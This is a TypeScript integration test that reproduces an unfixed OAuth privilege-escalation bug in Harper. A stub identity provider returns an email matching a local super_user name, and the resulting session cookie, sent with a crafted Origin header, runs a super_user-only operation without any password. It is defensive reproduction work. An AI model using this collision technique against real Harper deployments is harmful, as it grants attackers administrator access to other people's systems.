/**
 * REPRODUCTION: F2 — OAuth username collision escalates to hdb_user privileges
 *
 * Security finding (confirmed, unfixed as of this test):
 *   On a successful human OAuth login (`GET /oauth/<provider>/login` → provider →
 *   `GET /oauth/<provider>/callback`), the plugin writes
 *   `session.user = <usernameClaim>` (default: the `email` claim for generic/google
 *   providers — src/lib/OAuthProvider.ts:283, src/lib/handlers.ts ~line 467).
 *
 *   Harper's core auth middleware then resolves `session.user` on every subsequent
 *   authenticated request via `server.getUser(session.user, null)` →
 *   `findAndValidateUser(username, null, validatePassword=false)` →
 *   `usersWithRolesMap.get(username)` (security/auth.ts:275, security/user.ts:83).
 *   If a Harper hdb_user with that exact username exists, its full role (including
 *   `super_user`) is returned — with NO password check. If no hdb_user matches, a
 *   bare `{ username }` with NO role is returned instead.
 *
 * Attack: an attacker whose IdP identity maps to a username equal to a privileged
 * local hdb_user (e.g. a super_user named "victimadmin") acquires that account's
 * permissions for every subsequent session-authenticated request — without knowing
 * or supplying the victimadmin password.
 *
 * This test reproduces the escalation end-to-end:
 *   1. A super_user "victimadmin" is seeded in Harper.
 *   2. A stub IdP is configured whose /userinfo returns email "victimadmin".
 *   3. The human OAuth login flow is driven (login → stub IdP → callback).
 *   4. The resulting hdb-session cookie is used to call `list_users`, a
 *      super_user-only operation, via the operations API.
 *   5. The operation succeeds — ESCALATION PROVEN.
 *
 * Control: the same flow with an email that matches no hdb_user produces a
 * no-role session. The same operation is denied — proving the collision is the
 * exclusive cause.
 *
 * DO NOT fix this bug here. This file reproduces the current (vulnerable) behavior.
 */

import { suite, test, before, after } from 'node:test';
import { strictEqual, ok } from 'node:assert/strict';
import { createServer, type IncomingMessage, type ServerResponse } from 'node:http';
import { randomBytes } from 'node:crypto';
import { join, dirname } from 'node:path';
import { createRequire } from 'node:module';
import {
	setupHarperWithFixture,
	teardownHarper,
	sendOperation,
	type ContextWithHarper,
} from '@harperfast/integration-testing';

const require = createRequire(import.meta.url);

function getHarperBinPath(): string {
	return join(dirname(require.resolve('harper')), 'bin', 'harper.js');
}

const fixturePath = join(import.meta.dirname, 'fixtures', 'f2-repro-app');

// The privileged hdb_user that the attacker collides with.
const VICTIM_USERNAME = 'victimadmin';
const VICTIM_PASSWORD = 'VictimP@ssw0rd123!';

// An email that matches no hdb_user (control case).
const CONTROL_EMAIL = 'attacker@nowhere.test';

// Mutable: controls what the stub IdP returns in /userinfo.
// Set in each test before driving the OAuth login.
let stubbedEmail = VICTIM_USERNAME;

// ── Stub IdP ──────────────────────────────────────────────────────────────────

/**
 * Start a minimal HTTP stub IdP that handles the human OAuth flow:
 *   GET  /authorize — immediately 302s back to Harper's /oauth/stub/callback
 *   POST /token     — returns a fake upstream access token
 *   GET  /userinfo  — returns a user object whose `email` is `stubbedEmail`
 */
function startStubIdp(getHarperBaseUrl: () => string): Promise<{
	port: number;
	close: () => Promise<void>;
}> {
	return new Promise((resolve, reject) => {
		const server = createServer((req: IncomingMessage, res: ServerResponse) => {
			const url = new URL(req.url ?? '/', `http://127.0.0.1`);
			const path = url.pathname;

			if (req.method === 'GET' && path === '/authorize') {
				// Echo state back to Harper's human-login callback.
				const state = url.searchParams.get('state') ?? '';
				const code = `stub-code-${randomBytes(8).toString('hex')}`;
				const callbackUrl = new URL(`/oauth/stub/callback`, getHarperBaseUrl());
				callbackUrl.searchParams.set('code', code);
				callbackUrl.searchParams.set('state', state);
				res.writeHead(302, { Location: callbackUrl.toString() });
				res.end();
				return;
			}

			if (req.method === 'POST' && path === '/token') {
				res.writeHead(200, { 'Content-Type': 'application/json' });
				res.end(
					JSON.stringify({
						access_token: `stub-upstream-${randomBytes(8).toString('hex')}`,
						token_type: 'Bearer',
						expires_in: 3600,
					})
				);
				return;
			}

			if (req.method === 'GET' && path === '/userinfo') {
				// The `email` claim is the `usernameClaim` for the generic provider.
				// Setting it to VICTIM_USERNAME triggers the collision.
				res.writeHead(200, { 'Content-Type': 'application/json' });
				res.end(
					JSON.stringify({
						sub: `stub-sub-${randomBytes(4).toString('hex')}`,
						email: stubbedEmail,
						name: 'Stub Attacker',
					})
				);
				return;
			}

			res.writeHead(404);
			res.end('not found');
		});

		server.listen(0, '127.0.0.1', () => {
			const addr = server.address();
			if (!addr || typeof addr === 'string') {
				reject(new Error('Stub IdP: unexpected address shape'));
				return;
			}
			resolve({
				port: addr.port,
				close: () =>
					new Promise<void>((res, rej) => {
						server.close((err) => (err ? rej(err) : res()));
						server.closeAllConnections();
					}),
			});
		});

		server.on('error', reject);
	});
}

// ── OAuth login helper ────────────────────────────────────────────────────────

/**
 * Drive the full human OAuth login flow:
 *   1. GET /oauth/stub/login — captures the `__Host-oauth_browser` cookie and
 *      the redirect to the stub IdP.
 *   2. Follow to stub IdP /authorize — which immediately redirects to
 *      /oauth/stub/callback with a fake code + state.
 *   3. GET /oauth/stub/callback with the browser-binding cookie — Harper
 *      validates the CSRF state, exchanges the code, fetches userinfo, writes
 *      `session.user = <email from stubbedEmail>`, and 302s to the post-login
 *      redirect while setting the hdb-session cookie.
 *
 * Returns the raw hdb-session cookie pair ("name=value", no attributes) that
 * Harper issued. The cookie name encodes the port (e.g.
 * "127_0.0.2:9926-hdb-session=<uuid>").
 */
async function driveOAuthLogin(harperBaseUrl: string): Promise<string> {
	// Step 1: initiate login — Harper returns the browser-binding cookie +
	// redirect to the stub IdP.
	const loginRes = await fetch(`${harperBaseUrl}/oauth/stub/login`, { redirect: 'manual' });
	strictEqual(loginRes.status, 302, `login must redirect; got ${loginRes.status}`);
	await loginRes.body?.cancel();

	const browserSetCookie = loginRes.headers.getSetCookie().find((c) => c.startsWith('__Host-oauth_browser'));
	ok(browserSetCookie, 'login must set __Host-oauth_browser browser-binding cookie');
	const browserCookiePair = browserSetCookie!.split(';')[0];

	const idpLocation = loginRes.headers.get('location');
	ok(idpLocation, 'login must redirect to stub IdP');

	// Step 2: follow to stub IdP /authorize — immediately 302s back to
	// /oauth/stub/callback with the CSRF state echoed.
	const idpRes = await fetch(idpLocation!, { redirect: 'manual' });
	strictEqual(idpRes.status, 302, `stub IdP /authorize must redirect; got ${idpRes.status}`);
	const callbackLocation = idpRes.headers.get('location');
	ok(callbackLocation, 'stub IdP must redirect to Harper callback');
	await idpRes.body?.cancel();

	// Step 3: follow to Harper callback with the browser-binding cookie.
	// Harper validates CSRF, exchanges the code, fetches userinfo (email =
	// stubbedEmail), writes session.user, and sets the hdb-session cookie.
	const callbackRes = await fetch(callbackLocation!, {
		redirect: 'manual',
		headers: { cookie: browserCookiePair },
	});
	await callbackRes.body?.cancel();

	const sessionSetCookie = callbackRes.headers.getSetCookie().find((c) => c.includes('hdb-session='));
	ok(
		sessionSetCookie,
		`callback must set hdb-session cookie; Set-Cookie: ${JSON.stringify(callbackRes.headers.getSetCookie())}`
	);

	// Return just the name=value part (strip cookie attributes like Path, Expires, …).
	return sessionSetCookie!.split(';')[0];
}

// ── Operations API helper ─────────────────────────────────────────────────────

/**
 * POST an operation to Harper's operations API (port 9925) using the hdb-session
 * cookie that was issued at the REST API port (9926).
 *
 * The session cookie name is prefixed with the origin/host from which the cookie
 * was issued (auth.ts cookie-prefix logic). Harper's auth middleware extracts the
 * prefix from the incoming `Origin` header (falling back to `Host`). By sending
 * `Origin: http://<hostname>:9926` in the request to port 9925, we make the
 * prefix computation match the cookie's name — the session is recognized, and
 * `session.user` drives the permission check instead of the loopback bypass.
 *
 * This is the attack surface: a session whose `user` field is "victimadmin"
 * resolves to the victimadmin hdb_user (super_user role) without a password.
 */
async function callOperationsWithSession(
	operationsApiUrl: string,
	hostname: string,
	sessionCookiePair: string,
	operation: Record<string, unknown>
): Promise<{ status: number; body: any }> {
	const restOrigin = `http://${hostname}:9926`;
	const res = await fetch(operationsApiUrl, {
		method: 'POST',
		headers: {
			'Content-Type': 'application/json',
			Origin: restOrigin,
			Cookie: sessionCookiePair,
		},
		body: JSON.stringify(operation),
	});
	return { status: res.status, body: await res.json() };
}

// ── Test suite ────────────────────────────────────────────────────────────────

suite('REPRO(F2): OAuth username collision → hdb_user privilege escalation', (ctx: ContextWithHarper) => {
	let closeIdp: (() => Promise<void>) | undefined;

	before(async () => {
		// Boot the stub IdP first (ephemeral port), then pass its URLs to Harper.
		let harperBaseUrl = '';
		const idp = await startStubIdp(() => harperBaseUrl);
		closeIdp = idp.close;

		const stubBase = `http://127.0.0.1:${idp.port}`;
		await setupHarperWithFixture(ctx, fixturePath, {
			harperBinPath: getHarperBinPath(),
			config: { logging: { stdStreams: true } },
			env: {
				STUB_IDP_AUTHORIZE_URL: `${stubBase}/authorize`,
				STUB_IDP_TOKEN_URL: `${stubBase}/token`,
				STUB_IDP_USERINFO_URL: `${stubBase}/userinfo`,
			},
		});

		harperBaseUrl = ctx.harper.httpURL;

		// Seed the privileged victim user via the loopback-bypass path
		// (AUTHENTICATION_AUTHORIZELOCAL=true is set by the test harness).
		// sendOperation uses no credentials — the loopback address is trusted.
		await sendOperation(ctx.harper, {
			operation: 'add_user',
			username: VICTIM_USERNAME,
			password: VICTIM_PASSWORD,
			active: true,
			role: 'super_user',
		});
	});

	after(async () => {
		try {
			await teardownHarper(ctx);
		} finally {
			await closeIdp?.();
		}
	});

	test('REPRO(F2): OAuth email=victimadmin (collision) → session resolves to super_user → list_users succeeds', async () => {
		// Configure the stub IdP to return email = VICTIM_USERNAME.
		// The generic provider's usernameClaim defaults to "email", so
		// session.user will be set to "victimadmin" after the login.
		stubbedEmail = VICTIM_USERNAME;

		const sessionCookiePair = await driveOAuthLogin(ctx.harper.httpURL);

		// Call list_users — a super_user-only operation — using the session cookie.
		// auth.ts resolves session.user via getUser("victimadmin", null) →
		// usersWithRolesMap.get("victimadmin") → returns the hdb_user with
		// super_user role. No password was supplied or checked.
		const { status, body } = await callOperationsWithSession(
			ctx.harper.operationsAPIURL,
			ctx.harper.hostname,
			sessionCookiePair,
			{ operation: 'list_users' }
		);

		// ESCALATION PROVEN: list_users is restricted to super_user. Its success
		// here demonstrates that the OAuth-established session grants super_user
		// permissions solely because session.user == "victimadmin" (a matching
		// hdb_user). No password, no second factor, no ownership proof.
		strictEqual(status, 200, `list_users must return 200; got ${status}: ${JSON.stringify(body)}`);
		ok(Array.isArray(body), `REPRO F2: list_users should return user array (super_user succeeded); body: ${JSON.stringify(body)}`);
		ok(
			body.some((u: any) => u.username === VICTIM_USERNAME),
			`${VICTIM_USERNAME} must appear in the user list; body: ${JSON.stringify(body)}`
		);
	});

	test('control: OAuth email=attacker@nowhere.test (no collision) → no-role session → list_users denied', async () => {
		// The stub IdP returns a different email — one that maps to no hdb_user.
		stubbedEmail = CONTROL_EMAIL;

		const sessionCookiePair = await driveOAuthLogin(ctx.harper.httpURL);

		// Same operation, identical setup — only the OAuth-mapped username differs.
		const { status, body } = await callOperationsWithSession(
			ctx.harper.operationsAPIURL,
			ctx.harper.hostname,
			sessionCookiePair,
			{ operation: 'list_users' }
		);

		// CONTROL: auth.ts → getUser("attacker@nowhere.test", null) →
		// usersWithRolesMap.get("attacker@nowhere.test") → undefined →
		// returns { username } with NO role. The loopback bypass is skipped
		// because session.user is truthy (step 2 in auth.ts fires before step 3).
		// verifyPerms detects no role → "User has no role or permissions." →
		// operations server returns HTTP 403.
		//
		// This isolates the username COLLISION as the sole cause of the escalation
		// in the REPRO test above.
		strictEqual(status, 403, `expected 403 (permission denied); got ${status}: ${JSON.stringify(body)}`);
		ok(!Array.isArray(body), `expected error object (not a user list); got: ${JSON.stringify(body)}`);
		ok(
			'error' in body || 'unauthorized_access' in body,
			`expected permission-error fields in body; got: ${JSON.stringify(body)}`
		);
	});
});
